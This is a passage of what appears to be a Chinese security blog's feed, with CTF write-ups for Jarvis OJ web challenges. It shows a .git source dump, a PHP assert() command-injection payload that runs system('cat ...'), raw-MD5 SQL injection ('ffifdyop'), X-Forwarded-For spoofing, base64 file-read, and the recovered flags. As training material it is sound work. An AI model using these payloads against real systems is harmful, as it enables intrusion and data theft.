class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\小工具\githack\GitHack&gt;python GitHack<span class="selector-class">.py</span> http:<span class="comment">//web.jarvisoj.com:32798/.git</span></span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">index.php</span><br><span class="line">templates/about.php</span><br><span class="line">templates/contact.php</span><br><span class="line">templates/flag.php</span><br><span class="line">templates/home.php</span><br><span class="line">[Error] [Error <span class="number">183</span>] : u<span class="string">'web.jarvisoj.com_32798\\templates'</span></span><br><span class="line">[Error] [Error <span class="number">183</span>] : u<span class="string">'web.jarvisoj.com_32798\\templates'</span></span><br><span class="line">[OK] templates/flag.php</span><br><span class="line">[OK] index.php</span><br><span class="line">[OK] templates/home.php</span><br><span class="line">[OK] templates/contact.php</span><br><span class="line">[OK] templates/about.php</span><br></pre></td></tr></table></figure></li><li><p>成功down下源码,主要代码index.php</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">if (isset($_GET['page'])) &#123;</span></span><br><span class="line"><span class="xml">$page = $_GET['page'];</span></span><br><span class="line"><span class="xml">&#125; else &#123;</span></span><br><span class="line"><span class="xml">$page = "home";</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">$file = "templates/" . $page . ".php";</span></span><br><span class="line"><span class="xml">assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="xml">assert("file_exists('$file')") or die("That file doesn't exist!");</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">?&gt;</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>My PHP Website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse navbar-fixed-top"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbar"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-controls</span>=<span class="string">"navbar"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Project name<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"navbar"</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"home"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"about"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"contact"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=contact"</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--&lt;li &lt;?php if ($page == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top: 50px"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">require_once $file;</span></span><br><span class="line"><span class="xml">?&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>先看一下strpos()</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strpos</span><span class="params">()</span></span> 函数查找字符串在另一字符串中第一次出现的位置。</span><br><span class="line">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</span><br></pre></td></tr></table></figure></li><li><p>下面为绕过</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> <span class="keyword">file</span> =<span class="string">"templates /（我们插入的内容）.php"</span></span><br><span class="line">然而不能出现<span class="string">".."</span>,也就是不能目录穿越</span><br><span class="line">理论上我们想要如此：<span class="keyword">system</span>(<span class="string">'cat templates/flag.php'</span>);</span><br></pre></td></tr></table></figure></li><li><p>所以插入如下</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">','</span>t<span class="string">')=== system('</span>cat templates/<span class="built_in">flag</span>.php<span class="string">');//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">得到</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">"templates/"</span> . <span class="string">','</span>t<span class="string">')===system('</span>cat templates/<span class="built_in">flag</span>.php<span class="string">');// . ".php"'</span>, <span class="string">'..'</span>) === <span class="literal">false</span><span class="string">")</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#前面两边永真，后面注释掉，perfect!</span></span><br></pre></td></tr></table></figure></li><li><p>不过返回<strong>Detected hacking attempt!</strong>,查源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// TODO</span></span></span><br><span class="line"><span class="php"><span class="comment">//$FLAG = '61dctf&#123;8e_careful_when_us1ng_ass4rt&#125;';</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">Detected hacking attempt!</span><br></pre></td></tr></table></figure></li></ol><h1 id="61dctf-babyxss"><a href="#61dctf-babyxss" class="headerlink" title="[61dctf]babyxss"></a>[61dctf]babyxss</h1><p>题目入口：<a href="http://web.jarvisoj.com:32800/" target="_blank" rel="noopener">http://web.jarvisoj.com:32800/</a><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hint1</span>: csp bypass</span><br><span class="line"></span><br><span class="line"><span class="attribute">Hint1</span>: 最近问机器人有没有挂掉的人很多，这里解释一下，机器人是用系统的corntab起的，除非题目一起挂了，不然机器人是不会挂的，如果题目可以正常访问但是做不出来请检查自己的payload，不要让我再重复回答机器人挂没挂这个问题了。</span><br></pre></td></tr></table></figure></p><ol><li>一个提交框，主要是verify不知道<blockquote><p>( PS：substr($verify,0,4) === ‘5e51’ )</p></blockquote></li><li><p>以上为样式，每次都会变，下面直接爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">str=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(str)):</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(str)):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(len(str)):</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> range(len(str)):</span><br><span class="line">mingwen=str[a]+str[b]+str[c]+str[d]</span><br><span class="line">flag=hashlib.md5()</span><br><span class="line">flag.update(mingwen)</span><br><span class="line">md5=flag.hexdigest()</span><br><span class="line"><span class="keyword">if</span> md5[:<span class="number">4</span>]==<span class="string">'5e51'</span>:</span><br><span class="line"> print mingwen</span><br><span class="line"> <span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure></li><li><p>成功提交</p><blockquote><p>Admin has got your secret and will read it soon.</p></blockquote></li><li>这题真的试了很多payload都不行，vps也收不到referer的信息，真的怀疑环境问题 <del>不是自己菜吗？</del> 下面直接贴<a href="https://www.twblogs.net/a/5b7e5a8c2b7177683856d57e" target="_blank" rel="noopener">大佬WP</a></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一边查资料一边做题总算把这个平台的web搞掂，<del>不会做的再看看WP，虽然可能会偷懒233</del>，尽管不完全是独自做出来的，但还是收获不少知识，掌握不少姿势</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;flag在管理员手里&quot;&gt;&lt;a href=&quot;#flag在管理员手里&quot; class=&quot;headerlink&quot; title=&quot;flag在管理员手里&quot;&gt;&lt;/a&gt;flag在管理员手里&lt;/h1&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://web.jarvisoj.com:32778/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32778/&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;只有管理员才能获得flag，你能想办法获得吗？&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="平台训练" scheme="https://cy9nusg4rd3n.github.io/categories/%E5%B9%B3%E5%8F%B0%E8%AE%AD%E7%BB%83/"/>
    
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="SQL" scheme="https://cy9nusg4rd3n.github.io/tags/SQL/"/>
    
      <category term="审计" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>强网杯部分WP及Jarvis OJ(一)</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/09/11/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP%E5%8F%8AJarvis%20OJ(%E4%B8%80)/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/09/11/强网杯部分WP及Jarvis OJ(一)/</id>
    <published>2019-09-11T15:26:17.000Z</published>
    <updated>2020-04-18T03:38:27.336Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>我还是太懒了，已经半年没更新博客，跟个废人一样。</del>这个学期要振作起来！ 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，<strong>下面附上队友大腿的WP</strong><br><a href="https://lzy-wi.github.io/2019/09/11/qiangwangbei-GD-writewp/#more" target="_blank" rel="noopener">2019广东省强网杯writeup</a><br><a id="more"></a></p><ul><li>另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程</li></ul><h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>题目入口：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><ol><li>点击页面看到如下<blockquote><p>Please use port 51 to visit this site.</p></blockquote></li><li><p>以为用51端口访问，可是网页已经用了32770，改了之后访问不了的</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单纯的我以为这样:</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:51/</span></span><br></pre></td></tr></table></figure></li><li><p>后来才知道是本地51端口访问,使用curl命令</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --<span class="keyword">local</span>-port <span class="number">51</span> http:<span class="comment">//web.jarvisoj.com:32770/</span></span><br><span class="line"><span class="meta">#PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>题目入口：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a><br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost access only!!</span><br></pre></td></tr></table></figure></p><ol><li>X-Forwarded-For 127.0.0.1<blockquote><p>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p></blockquote></li></ol><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要密码才能获得<span class="built_in">flag</span>哦。</span><br></pre></td></tr></table></figure></p><ol><li>进入看到一个提交密码的输入框</li><li>随便输入字符(包括非法字符)都只返回<strong>Wrong Password.</strong></li><li><p>查看response发现</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></li><li><p>关键在于md5($pass,true)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line"></span><br><span class="line">string 必需。规定要计算的字符串。 </span><br><span class="line"></span><br><span class="line">raw 可选。规定十六进制或二进制输出格式： </span><br><span class="line"></span><br><span class="line">•  <span class="literal">TRUE</span> – 原始 16 字符二进制格式</span><br><span class="line"></span><br><span class="line">•  <span class="literal">FALSE</span> – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”<span class="keyword">or</span>’xxx’这样的字符串,则拼接后构成的语句为：</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> `admin` where <span class="attribute">password</span>=”or’xxx’</span><br></pre></td></tr></table></figure></li><li><p>所以我们要找一个字符串使得md5()后再decode(‘hex’)得到有’</p></li><li>下面提供两个payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content</span>: 129581926211651571912466741651878684928 </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 06da5430449f8f6f23dfc1276f722738 </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ?T0D??o#??’or’8.N=?</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span>: ffifdyop </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 276f722736c95d99e921722cf9ed621c </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ‘or’6蒥欓!r,b</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://www.freebuf.com/column/150063.html" target="_blank" rel="noopener">参考资料</a></p><ol start="7"><li>最后密码输入ffifdyop<blockquote><p>PCTF{R4w_md5_is_d4ng3rous}</p></blockquote></li></ol><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</span><br></pre></td></tr></table></figure></p><ol><li><p>刷新页面时F12在Network中看到<strong>showimg.php?img=c2hpZWxkLmpwZw==</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下为后面所用到的信息</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'c2hpZWxkLmpwZw=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'shield.jpg'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'showimg.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hvd2ltZy5waHA=\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'index.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'aW5kZXgucGhw\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'shield.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hpZWxkLnBocA==\n'</span></span><br></pre></td></tr></table></figure></li><li><p>读取showing.php内容:/showimg.php?img=c2hvd2ltZy5waHA=</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">$f = base64_decode($f);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php">&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">readfile($f);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>没发现关于flag内容，读取index.php内容:/showimg.php?img=aW5kZXgucGhw</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure></li><li><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤</p></li><li><p>读取shield.php内容,/showimg.php?img=c2hpZWxkLnBocA==</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span 